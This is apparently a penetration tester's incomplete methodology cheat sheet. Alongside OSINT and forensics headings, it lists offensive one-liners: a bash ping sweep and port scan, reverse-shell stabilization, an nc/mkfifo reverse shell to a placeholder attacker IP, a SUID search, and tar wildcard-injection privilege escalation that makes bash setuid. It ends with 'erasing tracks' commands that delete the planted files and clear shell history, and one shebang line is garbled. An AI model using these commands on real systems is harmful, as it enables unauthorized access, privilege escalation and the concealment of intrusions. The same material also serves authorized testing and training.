[SEVERELY INCOMPLETE]

# [External Network Methodology]
## OSINT
### Website Enumeration
- Injection
- Broken authentication and session management
- XSS
- IDOR
- Security misconfigurations
- Data exposures
- CSRF
### Web vulnerability scanning
- Nessus
# [Internal Network Methodology]
## 

# Digital Forensics
Check file type and metadata:
`file [FILE]` 
`exiftool [FILE]`

![image](https://github.com/user-attachments/assets/56e7b1ca-4955-4715-bdbb-9545720db1fb)

## Ping Sweep && Port Scan One-Liners (esp if nmap doesn't exist)
```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

## Reverse Shell Stabilization
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg
reset
```
## SUID search
```
find / -type f -perm -u=s 2>/dev/null
```
## Reverse Shell alternative (assuming nc exists)
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER-IP ATTACKER-PORT >/tmp/f
```

## Wildcard Injection - exploitation
```
printf '#/!bin/bash\nchmod +s /bin/bash' > shell.sh    OR
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/shell.sh    

echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
## Wildcard Injection - erasing tracks
```
rm -- --checkpoint*
rm -- "--checkpoint* "
rm shell.sh

[SESSION ONLY] history -c 
clear ~/.bash_history
```
